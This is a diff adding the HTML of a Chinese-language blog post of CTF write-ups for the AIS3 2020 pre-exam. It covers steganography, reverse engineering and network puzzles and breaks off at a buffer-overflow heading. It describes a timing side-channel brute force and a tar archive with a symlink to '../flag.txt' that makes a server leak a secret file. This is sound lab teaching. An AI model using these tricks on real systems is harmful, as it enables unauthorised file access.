@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html  lang="en">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.2.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>[Writeups] AIS3 pre-exam 2020 - oalieno blog</title>
+
+
+    <meta name="description" content="這學期修了網路攻防實習，這堂課要用 AIS3 Pre-Exam 當期末考，好喔。  攻擊腳本們在這 Misc Piquero 這題給了一張點字的圖，只要先找到出題者用的 generator 這個，接著就一個一個對照就解出來了。 1AIS3&amp;#123;I_feel_sleepy_Good_Night!!!&amp;#125; Karuego 這題給了一張 png，先用 binwalk --dd&#x3D;&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Writeups] AIS3 pre-exam 2020">
+<meta property="og:url" content="https://oalieno.github.io/2020/06/09/security/writeups/ais3-2020-preexam/index.html">
+<meta property="og:site_name" content="oalieno blog">
+<meta property="og:description" content="這學期修了網路攻防實習，這堂課要用 AIS3 Pre-Exam 當期末考，好喔。  攻擊腳本們在這 Misc Piquero 這題給了一張點字的圖，只要先找到出題者用的 generator 這個，接著就一個一個對照就解出來了。 1AIS3&amp;#123;I_feel_sleepy_Good_Night!!!&amp;#125; Karuego 這題給了一張 png，先用 binwalk --dd&#x3D;&quot;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oalieno.github.io/images/ogimage.jpg">
+<meta property="article:published_time" content="2020-06-09T14:29:00.000Z">
+<meta property="article:modified_time" content="2020-10-12T12:54:38.527Z">
+<meta property="article:author" content="oalieno">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oalieno.github.io/images/ogimage.jpg">
+
+
+
+
+<link rel="canonical" href="https://oalieno.github.io/2020/06/09/security/writeups/ais3-2020-preexam/"/>
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/bottom-to-top.css">
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-87869756-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-87869756-1');
+</script>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-2-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" width="25" height="25" style="margin-right: 10px"><g id="flat"><path d="M52,23a20,20,0,0,0-40,0V53a4,4,0,0,0,8,0V48a4,4,0,0,0,8,0v9a4,4,0,0    ,0,8,0V44a4,4,0,0,0,8,0V55a4,4,0,0,0,8,0Z" style="fill:#f98c96"/><rect x="19" y="44" width="2" height="2" style="fill:#e4544f"/><rect x="43" y="40" width="2" height="2" style    ="fill:#e4544f"/><path d="M32,37A12,12,0,0,0,44,25H20A12,12,0,0,0,32,37Z" style="fill:#fff"/><path d="M32,33a8,8,0,0,0,8-8H24A8,8,0,0,0,32,33Z" style="fill:#ffd782"/><path d=    "M32,29a4,4,0,0,0,4-4H28A4,4,0,0,0,32,29Z" style="fill:#e4544f"/><path d="M32,13h0A12,12,0,0,1,44,25v0a0,0,0,0,1,0,0H20a0,0,0,0,1,0,0v0A12,12,0,0,1,32,13Z" style="fill:#394d5    c"/><path d="M26,22H24c0-4.746,5.233-6,8-6l0,2C31.757,18,26,18.064,26,22Z" style="fill:#98a5a6"/><path d="M44.132,14.5C40.476,8.1,32.083,8,32,8V6c.392,0,9.629.085,13.868,7.5Z    " style="fill:#e4544f"/><circle cx="7" cy="10" r="3" style="fill:#f98c96"/><circle cx="57" cy="7" r="4" style="fill:#f98c96"/><circle cx="59" cy="37" r="3" style="fill:#f98c9    6"/><circle cx="5" cy="27" r="2" style="fill:#f98c96"/></g></svg>
+                oalieno blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">首頁</a>
+                
+                <a class="navbar-item"
+                href="/archives/">歷史文章</a>
+                
+                <a class="navbar-item"
+                href="/categories/">分類</a>
+                
+                <a class="navbar-item"
+                href="/tags/">標籤</a>
+                
+                <a class="navbar-item"
+                href="/about/">關於我</a>
+                
+                <a class="navbar-item"
+                href="/old/">舊部落格</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="Search" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+                <a class="navbar-item github-source" href="https://github.com/oalieno/oalieno.github.io">
+                    <div class="github-source-icon"><i class="fab fa-lg fa-github-alt"></i></div>
+                    <div class="github-source-repository">
+                        oalieno/oalieno.github.io
+                    </div>
+                </a>
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-9-tablet is-9-desktop is-9-widescreen has-order-2 column-main">
+<div class="card ">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-06-09T14:29:00.000Z">2020-06-09</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    39 minutes read (About 5870 words)
+                </span>
+                
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span> visits
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                [Writeups] AIS3 pre-exam 2020
+            
+        </h1>
+        <div class="content">
+            <p>這學期修了網路攻防實習，這堂課要用 AIS3 Pre-Exam 當期末考，好喔。</p>
+<p align="center"><img data-src="/images/ais3-scores.png" class=" lazyload"  width="500" title="AIS3 Pre-Exam Scores"></p>
+<p><a href="https://github.com/OAlienO/CTF/tree/master/2020/AIS3-pre-exam">攻擊腳本們在這</a></p>
+<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
+<h3 id="Piquero"><a class="header-anchor" href="#Piquero"></a>Piquero</h3>
+<p>這題給了一張點字的圖，只要先找到出題者用的 generator <a href="https://www.mathsisfun.com/braille-translation.html">這個</a>，接著就一個一個對照就解出來了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Karuego"><a class="header-anchor" href="#Karuego"></a>Karuego</h3>
+<p>這題給了一張 png，先用 <code>binwalk --dd=&quot;.*&quot; Karuego.png</code> 拉出一個 zip 檔，這個 zip 檔有加密，原本想用 <code>fcrackzip</code> 之類的爆破工具，但 <code>zsteg -a Karuego.png</code> 下去發現 LSB 有一段文字 <code>The key is : lafire</code>，zip 檔解開裡面有一張 <code>Demon.png</code> 打開就看到 flag 了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Soy"><a class="header-anchor" href="#Soy"></a>Soy</h3>
+<p>這題給了一張 png，是被墨漬污染的 QR Code，我用 <code>https://merricx.github.io/qrazybox/</code> 把已知的黑點白點都畫了上去就解出來了，因為大部分的 Data 區塊都沒被污染到吧，這個網站上畫 QR Code 的時候記得要畫白點，不要只畫黑點，沒畫的會是未知的灰點，我在這裡卡很久Q</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Saburo"><a class="header-anchor" href="#Saburo"></a>Saburo</h3>
+<p>這題要 <code>nc 60.250.197.227 11001</code>，沒給原始碼，連上去要輸入 flag 給他，他會輸出你幾秒後輸了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag: A</span><br><span class="line">Haha, you lose in 24 milliseconds.</span><br></pre></td></tr></table></figure>
+<p>猜測是 Side Channel Attack，原始碼猜測大概是 ( 不負責任亂寫 code 如下 )</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span><span class="params">(real_flag, user_flag)</span>:</span></span><br><span class="line">    l = len(user_flag) <span class="keyword">if</span> len(user_flag) &lt; len(real_flag) <span class="keyword">else</span> len(real_flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(user_flag)):</span><br><span class="line">        <span class="keyword">if</span> user_flag[i] != real_flag[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> i == len(user_flag) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">'AIS3&#123;...&#125;'</span></span><br><span class="line">user_flag = input()</span><br><span class="line"></span><br><span class="line">start = time.clock()</span><br><span class="line">win = compare(real_flag, user_flag)</span><br><span class="line">end = time.clock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> win:</span><br><span class="line">    print(<span class="string">f'Haha, you lose in <span class="subst">&#123;end - start&#125;</span> milliseconds.'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">f'Oh, you win. QQ'</span>)</span><br></pre></td></tr></table></figure>
+<p>但是很多人在連線的時候去算 cpu time 會抖的很大力，所以後來 server 應該是改成用模擬的 ( 就比較穩了 )，就是錯了就加個 random 小 noise，對了就加一個大一點的值之類的。</p>
+<p>所以每個字都爆搜 0 - 255，然後取最大的就好了，可以每次嘗試都送個十次取平均之類的，或是把 log 記起來，之後如果爆搜所有 byte 都沒有進展的話就，回去找第二高的，會比較穩。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Shichirou"><a class="header-anchor" href="#Shichirou"></a>Shichirou</h3>
+<p>這題要 <code>nc 60.250.197.227 11000</code>，有給原始碼，給他一個 tar 檔，他幫你解開然後把解開的 <code>guess.txt</code> 跟 local 的 <code>flag.txt</code> 的 sha1 做比較，如果一樣的話就噴 flag。<br>
+tar 可以壓縮 symbolic link，自己做一個 symbolic link 指向 <code>flag.txt</code> 就完成了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../flag.txt guess.txt</span><br><span class="line">tar -cf test.tar ./</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Clara"><a class="header-anchor" href="#Clara"></a>Clara</h3>
+<p>這題給了一個 pcap 檔，一開始啥提示都沒有，後來有說是 Malware 在 monitor 電腦然後傳 encrypted data 給 C&amp;C Server，然後傳了兩次一樣的資料，看了老半天，會發現 tcp 流量裡面有類似 AIS3 的字樣，有兩大包 tcp，一包 10 MB 另一包 27 MB，加密的話大概也只有 xor 比較正常吧，所以複製了一些部分用 <code>xortool</code> 分析，找到 key 是 <code>AIS3{NO}</code>，而且看到 PNG 開頭的字樣和一些 xml 的 meta data，就可以確定假設正確也解對了(汗，既然兩次包的明文是一樣的那就把兩包做 xor 再 xor 上 <code>AIS3{NO}</code> 就得到另一包的 key 是 <code>xSECRETx</code>，接著把整包拿去做 xor 拉出圖片，圖片有好幾 MB 很大，一開始只有拉出一張圖片，某個動漫的圖，又卡了一下後，發現那包前面的部分有類似 header 的東西，他不是 8 的倍數，我一開始是直接不理他，但是猜測後面也有好幾段 header，讓 xor 沒對齊壞掉，所以我就把整段 data 暴力 shift 了幾次拿去 xor，就拉出所有照片了，其中一張有 flag，其他都垃圾，原本不知道有很多張圖片，也不知道 flag 在哪的時候還在開 <code>stegsolve</code> 和 <code>zsteg</code> 在圖片找 flag，浪費很多時間。<br>
+他的 packet 是很有秩序沒有亂傳的，header 裡面就是固定傳一個 <code>0xdeadbeeffaceb00c</code> 然後 C&amp;C 把剛剛那段 xor 加密回傳，接著後面檔案名字的大小，和檔案名字，每個都分開傳，每個都自己做 xor cipher，接著就是傳 data，都沒有走歪或是掉進什麼坑的話還是有機會解出來的，我也不常分析 packet 也沒分析過什麼惡意程式，經驗不足所以解很久還要看 hint QQ</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Reverse"><a class="header-anchor" href="#Reverse"></a>Reverse</h2>
+<h3 id="TsaiBro"><a class="header-anchor" href="#TsaiBro"></a>TsaiBro</h3>
+<p>這題給了一個 <code>ELF</code> 執行檔還有被加密的 flag 檔，被加密的 flag 檔的一小段大概長下面這樣</p>
+<p><code>發財..發財.......發財....發財.......發財....發財.發財........</code></p>
+<p>隨便用 ida 看了一下後，加密流程就是把 flag 轉乘 <code>flag // 8</code> 和 <code>flag % 8</code>，然後數字是多少就轉乘多少個點，所以最多 8 個點，上面那段就是 <code>[2, 7, 4, 7, 4, 1, 8]</code>，那解密就反過來組回去就好。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Fallen-Beat"><a class="header-anchor" href="#Fallen-Beat"></a>Fallen Beat</h3>
+<p>這題給了一隻 jar 執行檔，跑起來是一個節奏遊戲，要 Full Combo 才能拿到 flag，那直接 <code>JD-GUI</code> 下去看他，關鍵在 <code>PanelEnding.class</code> 裡面，定義了被加密的 flag 陣列，還有後面做 xor 解回 flag 印出來的部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] flag = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; </span><br><span class="line">    <span class="number">89</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">68</span>, <span class="number">109</span>, </span><br><span class="line">    <span class="number">109</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">45</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">121</span>, <span class="number">47</span>, </span><br><span class="line">    <span class="number">111</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">105</span>, Byte.MAX_VALUE, <span class="number">124</span>, </span><br><span class="line">    <span class="number">94</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">104</span> &#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.size(); i++)</span><br><span class="line">        <span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] = (<span class="keyword">byte</span>)(<span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] ^ ((Integer)cache.get(i)).intValue());</span><br><span class="line">    String fff = <span class="keyword">new</span> String(<span class="keyword">this</span>.flag);</span><br><span class="line">    <span class="keyword">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">"Flag: %s"</span>, <span class="keyword">new</span> Object[] &#123; fff &#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>這裡的 cache 原本以為是內建的東東，結果不是，追了一下發現在 <code>GameControl.class</code> 有定義，東西是從 <code>songs/gekkou/hell.txt</code> 抓出來的，那就直接照著 xor 就解出來了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Stand-up-Brain"><a class="header-anchor" href="#Stand-up-Brain"></a>Stand up!Brain</h3>
+<p>這題給了一個 <code>ELF</code> 執行檔，隨便看了一下發現他實做了 Brainfuck，然後程式碼在執行檔裡面，拉出來長這樣</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]]</span><br></pre></td></tr></table></figure>
+<p>人腦跑了一下發現前面一段是在做很多 if 判斷，後面有 <code>.</code> 的部分是印 flag 的部分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># if (ptr[0] - 67) &#x3D;&#x3D; 0</span><br><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">[</span><br><span class="line">    # if (ptr[2] - 56) &#x3D;&#x3D; 0</span><br><span class="line">    &gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">    [</span><br><span class="line">        # if (ptr[4] - 55) &#x3D;&#x3D; 0</span><br><span class="line">        &gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">        [</span><br><span class="line">            # if (ptr[6] - 54) &#x3D;&#x3D; 0</span><br><span class="line">            &gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">            [</span><br><span class="line">                # if (ptr[8] - 51) &#x3D;&#x3D; 0</span><br><span class="line">                &gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">                [</span><br><span class="line">                    # if (ptr[8] - 33) &#x3D;&#x3D; 0</span><br><span class="line">                    &gt;---------------------------------[&gt;[-]&lt;[-]]&gt;</span><br></pre></td></tr></table></figure>
+<p>所以只要你的輸入要是 <code>C8763!</code> 就會進到後面印 flag 的部分，所以可以直接執行原本的程式輸入 <code>C8763!</code> 跟桐人一起使出星爆氣流斬拿 flag，或是直接忽略前面把後面那段貼到線上的 Brainfuck Compiler 執行一下也可以拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Th1s_1s_br4iNFUCK_bu7_m0r3_ez&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Long-Island-Iced-Tea"><a class="header-anchor" href="#Long-Island-Iced-Tea"></a>Long Island Iced Tea</h3>
+<p>這題給了一個 <code>ELF</code> 執行檔還有被加密的 flag 檔，被加密的 flag 長這樣</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000</span><br></pre></td></tr></table></figure>
+<p>隨便嘗試了一下發現超過 8 個 bytes 之後的都不會變而且直接是明文了，把上面那段從 hex 轉回 bytes 就變成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x85\n*M?\xac\x14\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;\x00\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>
+<p>前面 8 個 bytes 已知 <code>AIS3{</code> 5 個字了，所以直接爆搜剩下 3 個字。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="La-vie-en-rose"><a class="header-anchor" href="#La-vie-en-rose"></a>La vie en rose</h3>
+<p>這題給了給 <code>PE</code> 的執行檔，原本以為要逆向 windows 了，打開後看到一堆 python 的函式庫還有 tkinter，發現他是用 PyInstaller 包的，參考 <a href="http://o1o1o1o1o.blogspot.com/2016/11/python-pyinstaller-reverse-engineer.html">這篇</a> 用官方的 <a href="https://github.com/pyinstaller/pyinstaller/blob/develop/archive_viewer.py">archive_viewer.py</a> 把 pyc 拉出來 ( 其實好像是 pyd 檔才對，好像格式上差了一點 )，在逆 pyc 的時候確定版本很重要，拉出來的 pyc 沒有 magic value header，可以隨便再撈個比如 <code>pyimod01_os_path</code> 出來，這個就有 magic value 是 <code>550d 0d0a</code>，所以是 Python 3.8 b4 版，先嘗試用了一下 <code>uncompyle6</code> 去還原原始碼，可是他噴錯然後失敗了，那我們就直接看 bytecode 吧，用 <code>marshal.loads</code> 載入為 code object 再用 <code>dis.dis</code> 去 disassemble，邊猜他的原始碼，可以邊用 <code>dis.dis(compile('x = 1', 'filename', 'exec'))</code> 去驗證，看了一下會發現</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">""</span>.join(map(chr, [secret[i] ^ notes[i % len(notes)] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret))]))</span><br></pre></td></tr></table></figure>
+<p><code>flag</code> 是用 <code>secret</code> 和 <code>notes</code> xor 出來的，<code>secret</code> 是寫死的，<code>notes</code> 是從 <code>input</code> 輸入進來的，然後做了下面的計算算出 <code>result</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">notes = list(map(ord, notes))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] + notes[i+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] - notes[i+<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+<p>最後把 <code>result</code> 跟一個固定的陣列做比較，所以我們有 <code>a+b</code> 和 <code>a-b</code> 只要把兩個加起來除以二就拿到 <code>a</code> 了，把 <code>notes</code> 還原再跟 <code>secret</code> xor 就得到 <code>flag</code> 了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Uroboros"><a class="header-anchor" href="#Uroboros"></a>Uroboros</h3>
+<p>這題給了一個 <code>ELF</code> 執行檔，是 C++ 寫的，總之就逆他，發現他是一個 circular double linked list，結構就像下面這樣很普通。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>總共有 314 個 Node，對輸入的每個字，他會先往下走 <strong>輸入的字乘上 7</strong> 次然後把走到的那個 Node 的值乘 64 加上 counter，counter 就是一開始是 1，每經過一個字加一，最後把整段輸出跟某個答案比較，對了就代表你的輸入就是 flag，所以就照著解回來，把數字當成 64 進位拆開，比如第 141 個 Node 存的 <code>70</code> 拆成 <code>64 * 1 + 6</code>，代表第一個和第六個字是 ‘A’，因為 <code>ord('A') * 7 = 141 ( mod 341 )</code>，就是把 <code>141 * inverse(7, 341) = 65 = ord('A')</code>，就這樣。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Pwn"><a class="header-anchor" href="#Pwn"></a>Pwn</h2>
+<h3 id="BOF"><a class="header-anchor" href="#BOF"></a>BOF</h3>
